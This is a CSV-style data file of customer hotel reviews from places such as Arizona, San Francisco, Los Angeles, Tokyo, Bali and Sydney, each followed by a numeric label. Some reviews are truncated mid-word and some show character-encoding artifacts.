"don't stay here!!! we were robbed of $8,000 in property while staying here. at the end of our arizona vacation, we decided to stay at this very high priced resort to give ourselves a treat. we thought, with the waterpark and all the activites, it would be a great place for our family vacation to end. unfortunately, it didn't turn out that way. we were on the last day of our vacation when we went down to the waterpark for the day. my husband placed his shorts containing his wallet, room key and eyeglasses in a locked locker in the men's changing room. he went to check on the locker in the afternoon to discover the lock had been cut with bolt cutters. because we had signed for our breakfast that morning, he also had a receipt with our room number on it which allowed the thieves to go into our room and remove everything of value. computers, cameras, i-pods and many personal items which cannot be replaced. there are no in room safes. we waited ten hours for the phoenix police to show up and the only thing hilton offered to do was pay for our dinner. we are still in the proccess of sorting out all the financial problems. my advice, if you insist on staying here, leave all your valuables at home!",0

"excellent location and nice amenities my friend and i stayed at the stanford court for the thanksgiving holiday from november 24-29. it was our first time in san francisco. the location is unbeatable - nob hill is clean, quiet and cozy, away from all the noise, tourists and panhandlers 4 blocks down the hill in union square. i was overall very satisfied by the hotel but i was disappointed in some areas. i have to agree with some of the other reviewers here that the front desk staff is a little cold. not necessarily rude but just stiff and not very welcoming. they were accommodating when our room wasn't ready even though it was well past the check in time so we ended up in a large corner unit with pretty decent views. the doormen and the housekeeping staff are excellent - we were always happily greeted and they were responsive to our needs.there were some nice amenities but quite overrated. we had bathrobes which were a nice touch. the heated towel rack didn't do much to heat the towel except in the three spots where the rack hit the towel - maybe my expectation was too high. what i liked much better was the heat lamp which kept the room toasty so you didnt get the chills when you emerged from the shower. the showers are awesome - the water pressure was perfect. i don't usually make showerheads a point in my reviews but it was that memorable! also, all the beds had the amazing new marriott featherbeds which are just heavenly. the coffee, tea or hot chocolate service in the mornings was nice too but don't expect the beverages to be of high quality.my friend and i walked almost all of san francisco. we had dinner in the union square area most nights and would trek back up the 4 or 5 blocks uphill to the hotel. we don't exercise but we are from cities where we walk a lot, albeit on flat ground. i would use your own judgement for walking around but you can save a lot of money and see much more by walking. the public transportation system is confusing because there are 10 different types of public transport serving limited areas. bart seems to be more of a commuter train going out to suburbs with select stops in the city. buses weren't the best option because it can be confusing for tourists. the cable cars don't go very far and for $5 per one-way ride, it's a total rip-off. there was also some cable train system which was cheap and got us out to castro but it took a lot of maps and research to get around for cheap. i still recommend walking to most areas and cabbing back at day's end. i fell in love with san francisco and i would stay at the stanford court again.",0

"Anticipate delays/problems - overall and ok experience. LONG STORY SHORT - stay here if you know EXACTLY what you want to do and do not rely on hotel staff for ANYTHING!We arrived in SFO around noon - and thought we would try and check in. It was no suprise that our room was not available. We didn't expect our rooms to be available but thought we might try anyway. We checked our bags in with the bellman - who was exceptionally accomodating and offered discounts to the spa and adjacent shopping areas. We were in town for the Nike Women's Marathon and had asked for directions to Union Square. We were suprised by the close proximaty of all of the shops and restaurants in between! Returned around 3:30pm to check back into our hotel when the front desk notified us that the room was not available. No solution or appology was offered for this inconvenience. I had asked if they had an executive lounge and had requested to have access until our room was available. They did make this accomodation and the IC club was appropriately staffed and had nice amenities. We received our room key approximately 45 minutes later and proceeded to our room. We were mortified that the room was occupied by another guest at the hotel. Luckily for both parties, everyone was fully dressed (I actually read this happening to another tripadvisor reviewer). We returned to the executive lounge and discussed our situation. They appologized and we incurred a half hour delay with the next room assignment. The new room was nice and clean - beds were comfortable. The staff sent a fruit plate with an appology .Once in the room, we called to have our bags delivered to the room. After waiting an hour, we went to the lobby to aquire them ourselves. There was no appology or assistance and were rudely handed our bags. Here is some info on the rest of the property:POOL/HOT TUB/WORK OUT AREA - the pool is a lap pool only - and is nice and clean. The hot tub had an over abundance of chlorine which made our eyes water. We notified the management but was in the same condition the following day.SPA - just ok. We have been in lavish spas...and this is definately the lower end of the scale. Typically there is a great place to hang and relax with the girls prior to and after the treatment - well - don't expect to do this at the spa. There is no separate hot tub area either. We were directed to the pool area when I asked. The shower/make-up area can only accomo",0

"not impressed i got a good rate on priceline which was just as well because the rack rate would have been extortionate for the state of the bathroom and services. the bathroom was dirty; far more water came out of the tap than out of the showerhead on the shower setting; the water did not drain from the tub. yuk. the pinstripe dark decor is depressing. the pool was nice early in the morning but in the afternoon there was a corporate function going on and since it's a small pool area it wasn't really inviting for an informal swim. most of the lifts didn't work -- it took about 15 minutes to get down. the concierge sighed when i wanted to buy a stamp. the room service food was, as expected, overpriced and ridiculously salty. i wouldn't stay again.",0

"best service ever, anywhere my husband and i stayed at the okura eight nights...we have so many words of praise for the hotel and staff that it is hard to convey here in brief.we highly recommend becoming members of the okura club international, which you can do for free via their website, because it really includes quite a bit of great free perks as one of the other reviewers on this website says. we also got fresh flowers put in our room the day after arriving. however, i would assume from our stay that everyone gets the same 5-star level of service which was just mind-blowing for us.we had quite a busy schedule so we didn't get to use the hotel spa/gym facilities, but we did eat breakfast in the camelia coffee shop and have drinks in the highlander and orchid bars. as an american, it is slightly unsettling to have a team of employees be at your whim and serve you as if you were their only customer. for example, when we were having breakfast, when our coffee cups became even just a bit below full, someone was ready to top them off! they also came and picked off the sugar packet wrappers from your saucer to make sure they weren't in the way! we had breakfast the last morning at the buffet in the terrace restaurant, which is great in terms of choice. all the restaurants and bars are extremely pricey, but the level of service really does soften the blow.we stayed in the south wing and yes, the hotel is huge. however, the elevators and hallways are all clearly marked and it really is not hard to get your way around. again, the staff is always ready to help. one afternoon, my husband and i were going back to the south wing from the main lobby and it was as a staff member magically appeared to help us bustle our way through several hundred (literally here, folks!) japanese business men coming from a conference room. the staff member prodded everyone aside and got us through the huge crowd.our room was beautiful and spotlessly clean. the hotel provides you with slippers, yukata, luxurious toiletries, a hot tea pot with your pick of teas and fine china from which to drink it in. we also had a private fax machine with our own number that allowed us to send some faxes at only 50 yen per use-- unbelievable! be forewarned, however, unless you have your own computer, internet access is not friendly here....the webmail on tv is terrible and the business center is difficult to use. the beds are just heavenly, too, which is rare for any hotel in our opinion.the hotel decor is charming in its own right: it is a bit",0

"sheraton lax in june we enjoyed our stay at this hotel. we stayed for two weeks and paid $109/night through hotwire.com. at the time of booking, other comparable hotels were charging closer to $150/night.the amenities provided at the hotel meet the criteria of a 4-star hotel. there is an airport shuttle that runs 24 hours a day (there are multiple shuttles and the wait time is about 5-10 minutes). there are two restaurants in the hotel: the brasserie serves breakfast and lunch (on the expensive side-simple breakfast will run about $12-$14, $16 for the breakfast buffet), and shula's (steaks will run about $40). in addition, there is a starbucks which opens at 5:30am. there is a subway within 1 block which serves from 6:00am to 9pm. if you are renting a car, there are a number of restaurants within 2 miles. for a simple, inexpensive dining place (where the locals go), try dinah's on sepulveda blvd.tips:free coffee is stationed at the bar in the lounge. free tazo tea bags can be taken at the business office center on the 2nd floor. lemonade is served at 3:30pm in the lobby.if you have a car, parking is provided by an independent company towards the back of the hotel. cost is about $13/day. otherwise, the hotel offers valet parking.there is air traffic noise but this can be remedied by purchasing inexpensive ear plugs before you start your trip.the primary clientele of this hotel is conferences and airline pilots/stewardesses, and probably those of us who used hotline.com to book. there are relatively few children in the hotel.we contacted guest services twice during our stay, once for additional towels and once for a/c noise. both issues were handled immediately.all the staff we came in contact with were very courteous, friendly, and efficient. we would definitely stay here again.cons:no free parkingno free continental breakfastno free internetlimited storage space for clothingroom noise was only occassionally a problemair traffic noise can last through the night since this is an international airport.if you are not turned off by any of these issues, then you'll enjoy your stay here, as we did.",0

"lovely stay at the tuscan inn this hotel seems to get very mixed reviews, particularly about the reception desk staff. i can only think that some of the staff are very good and some equally bad, since our experience was a very positive one. we were greeted warmly and asked how we had enjoyed our stay on leaving. both check in (when we were able to check in very early) and check out were fine and friendly. we have stayed at this hotel once before, a few years ago, so knew that the rooms were not particularly large. on this occasion our room was quite small, but extremely nice, although it did contain the smallest wardrobe i had ever seen! the hotel is very well situated, 5 minutes walk from fishermans wharf, shops, restaurants and cable cars etc. we were fortunate to get an inside (or courtyard) room, so were not disturbed by noise at all (except for 1 night when the fridge went mad!) we had a problem with the ac whilst we were there, but a very friendly and helpful maintenance man came within minutes of reporting it, and had it fixed at the touch of a button. valet parking is, in my view, unreasonably high at $38 per night, but again we knew this before we arrived so can't really complain. the best point about this hotel is the wonderful restaurant attached to it - cafe pescatore. both breakfast and evening meal were excellent - it is very well used, so bookings are advised for the evening. the late afternoon free wine reception was a really nice touch and we enjoyed this very much. so once again, we enjoyed a lovely stay at this hotel and will almost certainly go back when we next visit sf.",0

"good location for nob hill, so-so rooms we just returned from a 4-night stay at the stanford court. i booked our stay as a combination hotel/car package through the marriott website, which saves money ($550 for 4 nights with economy car, and includes all taxes) but also creates a couple of problems: (1) you cannot specify the type of room or bed; and (2) you have to find somewhere to park your car; the hotel valet costs about $43 per night. when we checked in, the desk clerk tried to get us to upgrade our room to a queen non-smoking ($30 more per night) or a king ($50 more per night). we decided to stay with the room she offered (a queen in an optional smoking room), and the room turned out to be smoke-free, with a nice view. it was a bit dated, but perfectly adequate--i would rank it as a 3.5 star. our room overlooked the cable car intersection, but the noise wasn't that bad. as for the parking, it turns out there is a small parking lot right across the street from the hotel, which charges $20 a day (no in-and-out privileges, however). you can also park at the lot for $15 for up to 12 hours. this is a bargain as the commercial garages in the nob hill area charge about $3 for every 20 minutes, with maximums of $27-$31 a day.the greatest advantage of this hotel is the proximity to the other hotels on nob hill. the fairmont is right across the street, the mark hopkins at the end of the block (uphill), the huntington another block up, and the ritz-carlton 2 blocks down. the biggest problems, of course, are the steep climbs up from the union square area. however, if you take your time up the hill, it will be ok. i wouldn't wait for the cable cars, as they are usually packed to the gills.all in all, the hotel was fine, but i would stay elsewhere on my next visit to the bay area...the hills and the parking were a bit much.",0

"nice and comfy we lucked out with priceline and got this hotel for about half the cheapest hyatt website price. asked for a nonsmoking king on upper floor and got it! first room had so much air freshener sprayed in it that we couldn't handle it. didn't even unpack. when i called the front desk, they were great and offerred to send a bellman up with the key to another room one floor higher which she thought might not be as perfumey. the second room was great. no perfumey deodorizer, just clean. they need to tell the maids to take it easy with that stuff. some of us are allergic and those windows do not open! anyway, after that we loved the room. every time i called for something they were super nice and always asked what else we needed. nice! we used the pool area and at first it was nice and quiet until two couples showed up with two 18packs of canned beer and i thought to myself, surely the hyatt is not going to allow this. but, apparently they did. kind of tacky letting people bring in giant cases of own beer into the pool area. reminded me of a frat party or something. just not what you would expect. parking is expensive for phoenix, $15.00 for 24 hours, but since it was the weekend, we lucked out and managed to find parking meters which are free weekends and didn't have to pay. honestly, though, even if i had payed the hyatt website price for this hotel, i would not have been dissapointed with the room. i just wish they could monitor the pool a little more. those people were a little obnoxious. the front desk clerks deserve high praise for being very nice and very helpful... would stay there again.",0

"Average We had read the reviews and were bound and determined to avoid being the uber-picky guests who complain about every little thing. After the first full day brought a flood into our closet that completely drenched 90% of our clothes, we found ourselves squarely along side the moaners and groaners. Ugh. Had it not been for this flood and need to pack up and move rooms so early in our trip, the other issues would've probably seemed minor enough not to mention. It is what it is, and our views were probably tainted by this experience. If you get lucky and have no room problems, your vacation will probably be pretty smooth.The Good-The beach and resort in general are beautiful. Most of the fountains were working, and the ones that weren't look like they will be nice once functioning. The gardens are obviously just starting, but look like they will be stunning in the future. The beach is easily the most scenic one around....a quick walk either way shows that to be true very quickly. Many palapas scattered on the beach, along with two massage huts....very nice. The catamarans are readily available (I believe there are four), as well as kayaks. We used the catamarans and had a blast.....they will give you a free lesson if you've never used them before, and it's quite simple to get the hang of.The staff is the friendliest I've come accross in my limited A.I. travels which include Mexico and Jamaica. No, they don't all speak fluent English, but they all try their hardest to accomplish whatever it is you are asking for. We booked the Paradise Club Adults Only (more on that later), and the VIP check-in process was completely painless and prompt. That private lounge was always staffed with fluent English-speaking managerial types who were always ready to answer any question or respond to any problem. There was rarely even a slight wait to speak to someone eager to attend to our needs. The needs didn't always get met right away, but they were trying.The ala carte restaurants were easily booked through the VIP reservation system days in advance, which was nice. Those who didn't purchase the upgrade looked to have quite a nasty time of it, though. It seems they've been trying different systems, and the current one didn't look too smooth (we were there from Feb11-Feb18). But, as Paradise Club members it was as smooth as butter, and we were always sat promptly at our reservation times. We found the service at the restaurants to be very good, with the food being the best at the American (steak was very tender). We never made it to the Asian, which seemed to get good reviews.....the Italian was good, and we didn't care for the French at all (have had better at other resorts). The pasta station at the buffet was excellent...probably the best food in the entire resort, if you like pasta.The paradise pools were very quiet and enjoyable...the main pool was always teeming with activity if that's your thing. Again, the sprawling pools made for a very scenic look, especially with the palapa style bars at each one (three swim-up bars, two of which are VIP). The snack bar had long hours, providing pizza, burgers, hotdogs, and ice cream, among other things. They also set up food stations on the beach (grilled chicken, burgers, hotdogs) on a daily basis, which was another nice touch.The Tanhtra rooftop bar was very romantic....a great place to go for drinks after 9 pm. Really they could stand to open that one earlier in the day....I know we would've spent more time there if we could have. Beds draped with white flowing sheets, and great service from the waitresses.....it was perfect.The Not-So Good-The food on the whole was quite average, even for an all-inclusive, and this was especially true of the buffets. If you can be there when the tray comes out, no worries....but if it's been there for any length of time at all, there's a good chance the food will be cold by the time it hits your mouth. This was especially true of the burgers and hotdogs which they seem to cook in very large numbers to leave under the heatlamps. The food that was hot was simply unimpressive, aside from the pasta station that I already mentioned. The resort isn't up to par when it comes to construction, it seems. As noted there were pipes bursting, and this is after only a month or so? In addition, broken tiles could be seen throughout the resort. One broken tile outside of an elevator had a danger sign on it, and the danger sign was held down with broken pieces of tile! One of the main steps up to the Tanhtra bar was also broken while we were there. Watch your step, bottom line.The resort was quite packed...overbooked it seemed. They didn't really leave room for error, as we were moved into what Clara (manager) referred to as the last remaining Paradise Club room in the ENTIRE resort! No slush, apparently. This created problems for anyone wanting to move rooms. Our view wasn't very good...luck of the draw I guess. The inside views are great (pool/ocean), but if you get stuck on the outside as we did you get a view of neighboring apartments (I think, couldn't tell), in addition to extra mosquitos. The mosquitos seem to enter the room while the maids are cleaning, as we always came back to three or four of them in the evenings. Bring a flyswatter...we forgot to, and I was smacking them with a rolled up plastic bag all week.Both of the rooms we stayed in had a rancid, raw-sewage type smell emanating from the pipes. I'm not talking about the musty smell you are used to encountering in the tropics....this was nasty, nasty stuff. A tip from a fellow guest really helped us out in that department....light candles and cover the drains with wet washrags. It made a huge difference.The maid service was very inconsistent. The first day on the second floor we seemed to get a very good maid....extremely clean room, and she even organized our shoes and such. After moving I think we got one that did the bare minimum to get by. For example, there was a used mouthwash left from whoever had stayed there previously, and after looking at it for three days we finally had to throw it away ourselves. No new toiletries or even washcloths for us after the move....we had to get them ourselves off a nearby cart once we figured out they simply were not going to be replaced. Also after the move we got a TV that wasnt even hooked up....that was only a minor issue, as it was fixed within hours of a complaint. The VIP upgrade was supposed to include beach towels delivered to the room.....we didn't get a second one for a couple of days. Again, it was a minor issue. Also not included was the room service menu, but the people at the front were happy to accomo",0

"stayed here on recommendation and wasn't disappointed my wife and i stayed here for a single night as we wanted to get out of la easily the next day down highway 1 - i'm a marriott platinum member so tend to get better treatment than the average guest so bear this in mind with my review. i was staying on points and had read about this hotel on tripadvisor/other sites as being one of the best marriotté¥??? in la - hence deciding to stay here for the night in question - we we're disappointed.arrived and found the hotel easily, put our car into the parking garage (cost about $23/night with check in/out privileges). check-in was a breeze, pleasant receptionist thanking me for choosing their hotel etc, made me feel very at home and happy. lobby also looked nice.our room was on the club floor (11), and had a nice view of the airport (as requested prior to check-in so that was noted and acted upon). the room had a nice flat screen high def tv and the usual great marriott bed. felt at home and enjoyed the nice bathroom too -although huge disappointment that later in the evening there was no hot water, so no bath, we didn't report the problem though as we didn't want to watch someone fixing it late in the evening. it was working by the next day.we had arrived a little late (~8pm) and after freshening up went to the club lounge to try 'deserts', which were very tasty (and free). the prices in the club lounge aren't cheap i admit, but, the offer of cocktails for about $9 isn't too bad for this class of hotel imho, whilst you can enjoy watching the planes land.for food there wasn't anything nearby apart from a burger king across the road, as such we asked in the club lounge for a recommendation for a nice italian. they gave us a name of one a short drive away - it was tasty, and it was also zagat rated we noticed, so definitely a positive recommendation from the staff.next morning we checked out and left, but, had a good time overall and if i was near lax in the future i'd try and stay here.",0

(internet access was available in the lobby.) i mentioned it and our rate was reduced to 80 euros. on another positive note, i was unable to directly obtain a reservation for the uffizi gallery, but i sent the hotel europa an e-mail asking for help, and they were able to get it right away for our desired",0

"paradise found We arrived early so staff took us all to the pool bar for a complimentry drink and refreshing towels. When we were shown to our room, we couldn,t believe our eyes! A three bedroom appartment, all with king size beds and their own bathroom. We had our own private splash pool and a cushioned gazeebo in our own personal back yard. The rooms were spacious, clean and well airconditioned and tastefully decorated. The restaurant was open air, which overlooked the huge hotel pool. The menu comprised of mainly local and asian flavours (I'm not too keen on spicey food) but breakfast had a huge selection of east and western food, and kids ate for free. We also have the Accor Gold Card which saved us 50% on all hotel meals, drinks and services, except room service. Hotel staff were extremely gracious and, after a couple of days, were greeting us by name. They also found out it was my husbands birthday and left a birthday cake in our fridge with a card signed by some of the staff. Very touching. The security was efficient at the hotel gate and also all around Nusa Dua and shopping and restaurants were only a ten minute walk, or you could take the shuttle bus to the Bali Collection which left about every hour till late. The only thing I could suggest, would be to perhaps accomo",0

"amazing weekend get-away i don't even know where to begin! my mother, sister and i met for a girl's weekend get-away from 2/9-2/12 at the royal palms and we couldn't have picked a more perfect place. we were looking for a nice, relaxing place where we could spend time together (we live in 3 different states across the country from each other). the resort is absolutely beautiful, the rooms are outstanding, and the spa was beyond words. we were told at check-in that the resort was fully committed, yet we felt almost as if we were the only ones there! our casita consisted of a living room, bedroom and large bathroom - more than enough room for the 3 of us to comfortably relax. we also had a patio that overlooked a lovely courtyard area that had a fountain and several wood fireplace pits. they were lit on friday night but not the others, which was a little disappointing. however, i'm sure that had we asked to have them lit, it would have been done right away!! we ate dinner outside of the resort 2 evenings but did enjoy t. cook's on saturday night. overall, it was lovely but the service could have been better. we did feel as if the waitress could have been friendlier and more involved in our dining experience (as opposed to just serving us food). the fitness center and spa were excellent. i enjoyed two treatments at the spa and they were phenomenal - worth every penny. i would like to comment on one event that happened during our stay that explains why the royal palms is royal in my book....during her massage, my mother and her massage therapist were talking about where we had eaten the night prior and my mom commented that we had eaten at t. cook's. she asked my mom what she had for dinner and my mom told her the duck. she asked her if she enjoyed it and my mom said yes, but that it had been a little dry. they went on to discuss other things and my mom didn't think anything of the conversation. when we all got back to the room, we received a call from the front desk advising us that the duck was going to be removed from bill!! what a surprise, especially when it's not expected. it's things like this that make you feel like you are a guest that is truly cared about.all in all, the royal palms is the nicest place i have ever stayed. it is not really for children and it's not for the die hard partier looking for night life entertainment. it's definitely better suited for the romantics or those looking to de-stress and be pampered. it's going to be hard staying anywhere else after my time at the royal palms!!",0

"love chelsea, good value hotel as we had read the reviews on tripadvisor before we booked, the chelase lodge was what we expected. the room was very small, not much room to move at all. however, the room was very clean and interestingly decorated. the toilets were in the hall (2 a floor), and they were always clean and free, we never had to wait for one. the room had air-conditioning which was essential in new york in summer. be aware that there are no lifts so you have to carry your luggage up the stairs. we loved the location, chelsea is so much fun! great restaurants nearby and not touristy at all, seemed to be quite residential area which made the area all the more interesting. the subway is a short walk from the hotel. given how much a hotel room can cost in new york, we thought the chelsea lodge was great value and we would definitely stay there again.",0

"horrible service we stayed at the hotel for a wedding. prior to our arrival, i called and confirmed our reservation for a non-smoking king size bed. when we got to the hotel, they stated they only had two non-smoking rooms - queen size and double size beds. so we opted for the non-smoking/queen size bed. the room was small, old, smelley, dusty and the lights were not working. our request for the second room was met with rude commentary and poor service. the second was much better than the first room, but more in-line with a one or two star hotel. it was not a four-star hotel. other guests that were attending the wedding also stayed at the hotel and had similar experiences. we were all very disappointed with the cleanliness of the rooms, service at the front desk and valet. we would not stay there again.",0

"Good deal, great service Overall I was extremely please with my decision to stay at this hotel. The free hi speed internet access was very reliable, and the refrigerator and microwave were modern and efficient. The housekeeping staff was great about providing clean dishes and utensils daily. The rooms are on the small side, but not tiny, and the beds (including sleeper sofa) were comfortable. The pool and pool area are small but pleasant. The excercise room is very small. It's a short walk to the beach, and the hotel provides nice big beach towels upon request. It was great having the Hilton Hawaiin village right across the street, with lots of restaurants, shops, and some free shows. If these are intended only for guest nobody said so. My many friends who stayed there were not impressed with the hotel and found everything very expensive, so I was even more pleased with my decision to stay at the Aqua Palms.My only complaint was that a few amenities mentioned on their website do not actually exist. The ones I cared about were CD players and continental breakfast delivered to the room. On the latter, they said they just changed policy and hadn't up",0

"rooms were noisy and area was ghetto was in los angeles on vacation with my family of four and found this hotel (back then it was new otani) for a reasonable $150/night. the room was rather cramped with 2 double beds, and the walls were thin. the worst part was that because of its downtown location, there were many helicopters flying around that made it hard for me to sleep. the tea garden sounds nice, but in reality is rather small and not exactly a long romantic stroll.not much in the area, and so like much of la, you'll need a car to get around. the staples center and koreatown are only a 5 minute drive away, and there's a small japanese plaza with a couple restaurants and shops within walking distance.i would not recommend unless you got it really cheap.",0

"warm reception in west los angeles we stayed here for three nights. it has only been open for a few months. the staff has obviously been told that service is a priority. every person we encountered, from chambermaids to other hotel staff, made a point of greeting us. we ate at the hotel restaurant two of the three nights and found the food to be of excellent quality, albeit a bit pricey. our room had a large screen television. while a nice feature, it underlined the fact that the room was a bit small, with a lot of furniture in it. something hotels always get wrong is that they use up every single electrical outlet in the room, meaning that you have to unplug something if you want to plug in a computer, charge a blackberry, etc. but in our room, there was a power bar built into the side of the dresser adjoining the desk, making it easy to connect devices.we were here to see a concert at ucla. one nice touch is that the hotel staff will drive you to any destination within about two miles, so we were taken to our show by the concierge.everything worked in the room (the ac was somewhat noisy). overall, excellent accomodations. we're docking it one star for the small room.",0

"Don't believe the brochure Very disappointing. Described as 4-5 stars. Reads wonderfully in brochure. In reality is more 2/3 star. Rooms a bit grubby, air conditioning smelled so much we had to switch it off and then the room became water logged. Sewage leaking from some external drains. Whole hotel needs more maintenance. Tiles slipping off roof. Tiles missing from pool - makeshift repairs done and broken tiles just thrown into flower beds in middle of pool along with cups and straws. Fridge in room rusty with pool of water in bottom. Toilet flushing constantly.Almost everyone we spoke to felt the same.Is quite a big hotel with not enough staff to keep up with demand. Had to set our own table in the restaraunt mostly.Around the pool sunbeds past sell buy ",0

"Freshen up on your spanish before going here.... I just returned from my vacation to Punta and I stayed at the Breezes resort from April 12th é¥?15th. We had many upsetting experiences that we encountered on our stay. To start off, I want to say that the transfers between the hotel and airport were perfect. Our flight landed on time and our bus was waiting for us when we arrived. We briefly waited for another couple to join us and we were off. We arrived at the hotel around 12:30 PM and went right to the front desk to check in. We were greeted by a gentleman who didné¥?? give us any information, he just handed us a packet, checked us in, said something neither of us understood, pointed down a hallway and he was done. We started walking towards an elevator while lugging 3 suitcases behind us. No one got us a bellman for our journey to the room. We went from floor to floor trying to find our room, but the signs were confusing and we couldné¥?? figure it out. We went back down to the front desk where the same man pointed to the bellman stand. Finally we had someone take us to our room. Once there, we realized that the comforters had crumbs or some sort of dirt on them, the view we had faced nothing and the location of the room was down a scary corridor, not to mention that the door next to us had a not so nice racial expletive carved into the door. We promptly decided to request a room change. When we went back to the front desk, the woman didné¥?? understand why we wanted to change, however gave us a key to check out another room. A very nice and patient bellman walked us to that room, which at least was a closer walk to most amenities and had a pool view (although it was below the main level down 2 flights of stairs, with no elevator access). We decided to switch. Once we finally got settled, we realized that the TV had no remote control (which we never did receive). When we got up to put the TV on, we realized we had no power. We called the front desk and they said they would send someone. A é hour passed and no one came to our room to check the power. We called the front desk again and they said they would send housekeeping?? I went to get into bed to lay down and I noticed a smell when I pulled down the comforter. To my disgust, when I looked at the sheets, there was a feces stain on it. With this, housekeeping came to the door and couldné¥?? understand us when we told them of the power until we starting flicking the switches. Apparently a card needed to be inserted in the wall that we knew nothing of. We then tried explaining to them that I needed the sheets changed. Again they didné¥?? understand until we showed them the stain. I also asked for the pillowcases to be changed and after she changed the sheets, she left the room. I ran down the hallway after her and she said sheé¥?? be back. We waited another é hour for pillowcases. At this point, we were starving so decided to check out the buffet. I should mention that on every occasion that we went to the buffet, there were flies all over the food, and the variety of the food never changed daily, and what we did try was tasteless in my opinion. We were able to get a reservation for dinner that night at the Italian restaurant, although upon check-in, they only gave us a reservation for one night, the next night. So we were lucky enough to have dinner at 9:30 PM. The dinner that night and every night for that matter at the specialty restaurants were good, however the process of making the reservation was very frustrating. They tell you that you must go daily to the front desk to make the reservation. The desk opens at 9 AM. We were there one morning at 9:30 AM and there was a sign saying that all restaurants were full for that night? Ironically we went back later in the day to find a gentleman making reservations for his entire stay. I asked the lady at the desk why I was told that we had to come every day to do that, and she gave me some sort of excuse that made no sense. Funny thing is that she happened to find us a reservation for that night, even though the sign was still up saying that all restaurants were full. We found the front desk staff to be very unhelpful, rude and barely able to communicate. While I understand that we were in another country where English is not the primary language, I would have thought that they would know enough to communicate with tourists. Instead, they didné¥?? even understand the word é¥?¸¨ateré¥? and at every restaurant we went to, wouldné¥?? give you your food/beverage until you answered them in Spanish. I felt like I was being quizzed every night. I do want to mention that the beach was beautiful, the pool was well taken care of and the premises of the resort were very nice. The entertainment crew and dancers were great, and we had a great time at the dance club every night. We also visited the spa, which was enjoyable. We did have an invitation to meet with our Apple representative the day after we arrived at 5 PM. We were with him for a total of about 10 minutes. He had little knowledge, and we repeatedly had to tell him our departure ",0

"the best hotel in fisherman's wharf! i just recently stayed at the tuscan inn and absolutely loved it! our room with 2 double beds was beautiful. (contrary to the comments of a previous reviewer, i never saw the rooms advertised anywhere as having 2 queen beds!) the room was not large, but was average size for a room in san francisco. the staff was friendly, courteous, professional and knowledgeable. you cannot beat the location! you are walking distance to all of the fisherman's wharf attractions, as well as a quick cable car or street car ride to most points in the city. the evening wine hour is a great idea, allowing guests to mingle with each other while enjoying complimentary beverages!all in all i would say this was one of finest hotel stays i have ever experienced. i highly recommend the tuscan inn to anyone looking for a great visit to san francisco!",0

"nice place but not as advertised. we stayed here over our spring break 4/13 through 4/20, with my husband and 2 children ages 8 and 10.upon arrival, check in was quick and easy. i asked for a first floor room with a pool view but even though i requested 4 mos. prior they could not accommodate. we had a 3rd floor room with partial view of the pool. the rooms were perfect for a family. two very comfortable queen beds, separated by a pocket door from the bathroom/toilet area, then doors again which separated the living area. this was perfect to put kids to bed and we could still watch tv. also, my husband the snorer was kicked out into the living area/pull out couch so the rest of us could sleep and we never heard him.the balcony is so small and awful view, we didn't sit out there even once. i knew there was no refrigerator so we purchased a cooler at walgreens right down the street and bought milk, juice, cereal and fruit so we didn't have to waste time or money going out to breakfast in the morning. we bought a big cooler and then just sent it home as luggage on the way home.the resort is very nice, well kept and beautiful. very large palm trees and beautiful flowers. the pool area is also nice. the water temp was cool and several adults were complaining that it would have been nice to have it a few degrees warmer (it may have been 78 degrees or so). the water slide was very fast and the kids loved it. my kids also enjoyed the putt putt, though some of the holes could use a lift. we all played tennis one morning an d that was fun too. my major complaint about this place is that, i booked it due to the multitude of organized kids activities so that my husband and i could relax some. apparently spring break had just ended in az so they scaled back on what they offered. there was a board posted at every hotel area indicating there would be pool activities every day at 10, 11, 1, 3, and 5 which included races, basketball games, water volley ball, slide races, watermelon eating contests, hoola hoop contests etc. well we were there for seven days and there were two hoola hoop contests and one slide race. (that was it for the week). we continuously asked the pool staff when the next activity would be. they just had excuse after excuse. i realize spring break ended for them but the vacationers were on their spring break. my kids were very good at keeping themselves busy but after a few days it would have been nice if someone could have organized some activities for the kids. even though i loved this place, this really irked me!!!!!we ate at the hole in the wall, very mediocre and pricey. the food at the pool was pricey. however, an adult sandwich was chock full of meat and kept all of us happy well until dinner. most sandwiches were $9. beers were $5 and up and mixed drinks around $8.we walked to aunt chiladas one night which was very good. also gallaghers across the street (pub food), sports bar which was good. lantana grille was very good. there are two hotel courtyards each with a pool and swim up bar. both swim up bars were closed the whole week (also weird and disappointing), we enjoyed using these pools later in the day which was much quieter than the water park and very comfy chairs. as there was no service here, we just packed a cooler and brought our own drinks,.no night life here to speak of. in the past we have done an all inclusive vacation, where there is entertainment at night and then the adults sit around and socialize a bit. there was none of that here. the resort was quiet by 9:00.the fitness room is fantastic. new modern equipment, classes offered, it couldn't have been better.we went to the grand canyon one day and made it in 3 1/2 hrs. . cut through flagstaff and it shaves a little of the trip. also went to sedona one day. awesome!! you have to do the pink jeep broken arrow tour as everyone says. pricey but well worth it.all in all a good trip. the staff at the front desk and concierge could not have been better. due to the lack of activities though i will probably go somewhere else next time.",0

"not just a hotel.. more like an apartment with privacy and quiet i checked out of shangri la to stay at this place, and really wished i had stayed here the entire 30+night stay in sydney. the hotel is in the rocks area, sandwiched between two streets, which makes it super quiet. it is hard to find, as the back entrance is off harrington street. full laundry, dishwasher, oven, microwave, fridge, yet maid service, mini bar, etc. everything anyone needs is at this hotel, including room service. why eat in the room, though? we brought water, soda, arnott's cookies , etc to the room and really had peace and quiet. the views were amazing as well. not once did we hear other people. there are very few rooms on the floors. the residents live in the high floors. we loved this place. my biggest complaint, however, is they changed the rates on us after we booked the place. i really had to argue with them about this. i suggest getting your rates per night in writing 100%. they upped our rates on various nights by $69 aud. i had to speak to the manager, as i felt scammed. they ended up finally just increasing it by $19 on various nights. how can a place get away with this? we were told our rate was $159 per night for 7 nights. when we checked out, some of the nights were $180, $205, $169.. very strange--what a scam, and what utter bs. other than this, we loved the staff, the hotel, the convenience of being so close to everything, yet blocks away from the noise. we would return here, but would simply request the nightly rate--by",0
